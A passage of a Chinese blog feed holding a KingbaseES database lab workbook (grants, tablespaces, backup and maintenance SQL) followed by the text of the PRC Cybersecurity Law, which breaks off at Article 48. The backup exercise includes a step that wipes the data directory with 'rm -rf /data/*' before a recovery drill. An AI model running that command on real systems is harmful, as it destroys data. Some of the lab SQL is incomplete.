test=# grant CONNECT ON DATABASE db01 TO user01;<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144356952.png)（4）  授予用户 user01拥有 db01库中 public模式 all权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> grant ALL ON SCHEMA PUBLIC TO user01 ;<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144611480.png)（5）  user01 用户登录 db01库后在 public模式中创建表 t01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>create table PUBLIC.t01(id int );<p></p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144807077.png)（6）  查看上述操作的 SQL代码 （7）  创建普通用户 user02 并授予用户 user02 连接数据库 db01的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> db01=# create user user02 password ‘user02’;<br> db01=# grant CONNECT ON DATABASE db01  TO  user02;<br> </p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145037688.png)（8）  授予对 user01用户的 t01 表拥有 select和 insert、update、delete权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> db01=# grant SELECT ON PUBLIC.t01 TO user01;<br> db01=# grant INSERT ON PUBLIC.t01 TO user01;<br> db01=# grant UPDATE ON PUBLIC.t01 TO user01;<br> db01=# grant DELETE on PUBLIC.t01 to user01;<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145411938.png)（9）  验证 user02 对 t01 表的操作权限（表执行查询、插入、修改、删除操作，无权删除 t01 表）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>db01=&gt; select * from PUBLIC.t01 ;<br>错误:  对关系 t01 权限不够<br>db01=&gt; insert into PUBLIC.t01 values (1);<br>错误:  对关系 t01 权限不够<br>db01=&gt; drop table PUBLIC.t01 ;<br>错误:  必须是关系 t01 的属主<p></p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145858876.png)五、创建表入录入数据（1）  在 db01 库 public 模式下创建表 t02，并插入数据（使用SQL语句） （2）  编写 SQL语句查看表 t02的数据 （3）  单表综合查询：查询人员表30及以上部门的平均工资，只显示出部门平均工资大于8000记录 （4）  多表关联查询：查询人员工号、姓名、部门名称，只显示5条记录 （5）  嵌套子查询：查询跟 141 号员工同职位，同时工资比 138 号员工高的员工信息 （6）  关联子查询：查询员工工资大于自己部门平均工资的所有员工信息 （7）将表 t02备份为 sql、csv、binary(二进制)格式，根据提示进行适当的配置 （8）查看导出文件 六、KSQL对象管理（1）  使用system用户连接IP地址为192.168.40.111，端口54321的对象 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118150320850.png)（2）  导入“MYSQL初始化脚本5.5.txt”，查看库内数据表库内有两个表：这两表用于下面的查询。1.scott.dept​                               2.sctott.emp  （3）  查看表 scott.dept（sql命令） （4）  导出表数据库到 csv 文件  七、切换用户登录（1）  查看连接![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160016825.png)（2）  创建用户kca，并登录kca（密码自定义）![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160107898.png)（3）  切换用户kca为system用户意见 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160219201.png)（4）  创建数据库db1并连接 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160254717.png)（5）  切换到数据库samples ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160326517.png)八、用户与角色授权（1）  创建用户u1（2）  创建角色r1 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160442649.png)（3）  对用户u1和角色r1，授权为可读写，可执行 九、表的模式和对象管理（1）  创建测试表table8(id int)（2）  创建用户user8 ，密码：KES8 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119103542701.png)（3）  授予user8访问库的权限为c/stystem ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119103649190.png)（4）  授予user8访问模式的权限为U/stystem ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119104007370.png)（5）  授予user8访问表的权限r/SYSTEM ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119104156834.png)（6）  修改用户口令有效期，查看用户口令有效期 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105521190.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105458515.png)（7）  删除user8表级权限依赖，模式级权限依赖，库级权限依赖 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105907811.png)（8）  撤消user8库级、模式级、对象级授权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>revoke CONNECT ON DATABASE TEST FROM<br>revoke USAGE ON SCHEMA PUBLIC FROM user8;<br>revoke SELECT ON PUBLIC.table8 FROM user8;</p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119110136806.png)（9）  删除user8用户是否成功 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119110249325.png)十、数据库模板（1）用管理员 system 连接数据库 TEST ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105631515.png)（3）  创建用户 user01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> create user user01 password ‘kingbase’;<br> </p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118104704043.png)（4）  创建数据库 db01，属主为 user01、编码为 UTF8、参照模板 template0、连接数为 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>  create database db01 owner user01 ENCODING ‘utf8’ TEMPLATE template0 CONNECTION LIMIT 10;<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118104901865.png)（5）  检查数据库的定义信息 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105022065.png)（6）  修改数据库 db01 属主修改为 system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br> alter database db01 owner to SYSTEM ;<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105106730.png)（7）  修改数据库 db01 名称为 db10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> alter database db01 rename to db10;<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105155648.png)（8）  删除数据库 db10，提示无法删除当前使用的数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>drop database db10 ;<p></p><pre class="line-numbers language-none"><code class="language-none"> ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105341261.png)（9）  切换到数据库 TEST ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105435329.png)（10）  删除数据库 db10，提示删除完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> drop database db10 ;<br> </p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105510110.png)十一、表空间的增删改查（1）  用管理员 system 连接数据库 test ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118150654326.png)（2）  使用元命令查看表空间信息，使用数据字典查看表空间信息，查看数据库的默认表空间信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br> \db+<br> select oid,spcname from sys_tablespace;<br> \l+<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119094244437.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119094355382.png)（3）  规划表空间对应的文件系统目录，切换到操作系统管理员 root，在根目录下新建目录 dir01，设定目录 dir01 的属主、属组、权限，检查目录 dir01 的定义信息![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118151558151.png)（4）  新建表空间 tbs01，由管理员 system 连接数据库 test，新建表空间 tbs01，关联目录/dir01，表空间属主默认，查看表空间 tbs01 的信息![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118151850349.png)（5）  修改表空间 tbs01 的属主和名称，管理员 system 登录数据库 test 并创建用户 user01，修改表空间 tbs10 的属主为 user01，修改表空间 tbs01 的名称为 tbs10![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152106841.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152157749.png)（6）  修改数据库 samples 的默认表空间为 tbs01，由管理员 system 连接数据库 test，修改数据库 samples 默认表空间为 tbs10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>alter database SAMPLES set tablespace tbs10;<p></p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152504956.png)（7）  移动表到新的表空间，由管理员 system 连接数据库 test，查看现有表空间，在表空间 sys_defualt 中创建表 t01 并插入 1 行数据，移动表 t01 到表空间 tbs10 中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> \db+<br> test=# create table t01(id int) tablespace SYS_DEFAULT ;<br> </p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093021134.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093219668.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093327756.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093429511.png)（8）  检查表空间修改结果，查看 samples 数据库当前的默认表空间，查看 test 数据库中 t01 表当前所在的表空间，查看新表空间的名称、属主等信息 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093800486.png)十二、系统物理备份 （1）开启归档模式，进行快速部署，配置 （2）在数据表里创建新表a1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000 （3）用命令手动完成一次增量备份 （4）在数据表里创建新表b1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000 （5）用命令手动完成一次全备份 （6）用命令rm-rf /data/*删除数据库，然后做数据库完全恢复。 十三、数据库简单运维（1）  查看 KES 版本信息![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118165956929.png)（2）  查看 license 有效期<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>select get_license_validdays();<p></p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118174602254.png)（3）  查看数据库实例启动时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>select sys_postmaster_start_time();</p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118174823902.png)（4）  查看 KES 无故障运行时长<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> test=# select date_trunc(‘second’,current_timestamp -<br> test(# sys_postmaster_start_time()) as uptime;<br> </p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175144920.png)（5）  查看数据库列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> \l<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175501188.png)（6）  统计当前数据库占用的磁盘空间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> select sys_database_size(current_database())/1024/1024||’mb’’mb’;<br> <pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175655666.png)（7）  统计所有数据库占用的磁盘空间总量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> <pre class="line-numbers language-none"><code class="language-none">（8）  统计表的空间占用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> <pre class="line-numbers language-none"><code class="language-none">（9）  统计表和与表关联的索引占用空间总量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> <pre class="line-numbers language-none"><code class="language-none">（10）  查看耗时较长的 SQL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br> <pre class="line-numbers language-none"><code class="language-none">（11）  采集连接数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p></p><p> ```</p><p>十四、系统情况检查</p><p>（1）  检查系统CPU情况</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118180216780.png"></p><p>（2）  检查内存情况</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118180104291.png"></p><p>（3）  磁盘资源消耗情况</p><p>（4）  SQL执行时间等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="数据库" scheme="http://www.xiaocaibi.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>中国网络安全法</title>
    <link href="http://www.xiaocaibi.top/posts/491de8e6.html"/>
    <id>http://www.xiaocaibi.top/posts/491de8e6.html</id>
    <published>2021-10-27T06:50:13.000Z</published>
    <updated>2021-10-27T07:56:38.469Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="中华人民共和国网络安全法"><a href="#中华人民共和国网络安全法" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h1><h3 id="中华人民共和国网络安全法-1"><a href="#中华人民共和国网络安全法-1" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h3><ul><li>《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。</li><li>《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于 2016 年 11 月 7 日通过，自 2017 年 6 月 1 日起施行。</li></ul><h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><ul><li><p>第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p></li><li><p>第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p></li><li><p>第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p></li><li><p>第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p></li><li><p>第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p></li><li><p>第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p></li><li><p>第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p></li><li><p>第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。<br>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p></li><li><p>第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p></li><li><p>第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p></li><li><p>第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p></li><li><p>第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。<br>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p></li><li><p>第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p></li><li><p>第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。<br>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p></li></ul><h2 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h2><ul><li><p>第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。<br>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p></li><li><p>第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p></li><li><p>第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p></li><li><p>第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。<br>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p></li><li><p>第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。<br>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p></li><li><p>第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p></li></ul><h2 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h2><ul><li><p>第一节 一般规定</p></li><li><p>第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p></li><li><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p></li><li><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p></li><li><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p></li><li><p>（四）采取数据分类、重要数据备份和加密等措施；</p></li><li><p>（五）法律、行政法规规定的其他义务。</p></li><li><p>第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。<br>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。<br>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p></li><li><p>第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p></li><li><p>第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。<br>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p></li><li><p>第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p></li><li><p>第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p></li><li><p>第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p></li><li><p>第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支 - 持和协助。</p></li><li><p>第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。<br>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p></li><li><p>第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p></li></ul><h2 id="第二节-关键信息基础设施的运行安全"><a href="#第二节-关键信息基础设施的运行安全" class="headerlink" title="第二节 关键信息基础设施的运行安全"></a>第二节 关键信息基础设施的运行安全</h2><ul><li><p>第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。<br>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p></li><li><p>第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p></li><li><p>第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p></li><li><p>第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p></li><li><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p></li><li><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p></li><li><p>（三）对重要系统和数据库进行容灾备份；</p></li><li><p>（四）制定网络安全事件应急预案，并定期进行演练；</p></li><li><p>（五）法律、行政法规规定的其他义务。</p></li><li><p>第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p></li><li><p>第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p></li><li><p>第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p></li><li><p>第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p></li><li><p>第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p></li><li><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p></li><li><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p></li><li><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p></li><li><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p></li></ul><h2 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h2><ul><li><p>第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p></li><li><p>第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。<br>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p></li><li><p>第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。<br>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p></li><li><p>第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p></li><li><p>第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p></li><li><p>第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p></li><li><p>第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p></li><li><p>第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p></li><li><p>第四十八条 